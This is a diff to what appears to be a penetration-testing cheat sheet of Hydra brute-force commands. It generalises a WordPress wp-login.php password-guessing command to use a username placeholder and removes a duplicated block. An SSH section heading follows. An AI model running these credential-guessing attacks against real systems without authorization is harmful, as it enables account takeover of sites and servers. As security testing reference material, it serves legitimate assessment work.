@@ -13,16 +13,9 @@ sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
 ### Wordpress
 ```
 sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
-http-form-post '/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
+http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
 -V
 ```
-### Wordpress
-```
-sudo hydra -l [USERNAME] -P [PASSWORD_FILE] [TARGET] \
-http-form-post '/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' \
--V
-```
-
 ## Services
 ### SSH
 ```
